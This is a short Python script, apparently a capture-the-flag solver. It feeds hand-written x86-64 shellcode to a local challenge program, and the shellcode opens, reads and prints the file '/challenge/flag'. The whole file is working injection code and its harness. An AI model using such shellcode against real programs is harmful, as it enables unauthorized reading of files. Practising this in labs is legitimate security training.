import subprocess
shellcode = b"\x48\xB8\x67\x65\x2F\x66\x6C\x61\x67\x00\x50\x48\xB8\x2F\x63\x68\x61\x6C\x6C\x65\x6E\x50\x48\x89\xE7\x48\x31\xF6\x48\x31\xD2\x48\xC7\xC0\x02\x00\x00\x00\x0F\x05\x48\x89\xC7\x48\x81\xEC\x00\x01\x00\x00\x48\x89\xE6\x48\xC7\xC2\x00\x01\x00\x00\x48\x31\xC0\x0F\x05\x48\xC7\xC7\x01\x00\x00\x00\x48\xC7\xC2\x00\x01\x00\x00\x48\xC7\xC0\x01\x00\x00\x00\x0F\x05\x48\x31\xFF\x48\xC7\xC0\x3C\x00\x00\x00\x0F\x05"

p = subprocess.Popen(['python3', 'c7/test.py'], 
                     stdin=subprocess.PIPE,
                     stdout=subprocess.PIPE,
                     stderr=subprocess.PIPE,
                     env={'PYTHONUNBUFFERED': '1'},
                     bufsize=0)  # No buffering
# Send input
p.stdin.write(shellcode)
p.stdin.close()

# Read output in real-time
while True:
    output = p.stdout.readline()
    if output == b'' and p.poll() is not None:
        break
    if output:
        print("Output:", output.decode().strip())

p.wait()
print("Return code:", p.returncode)
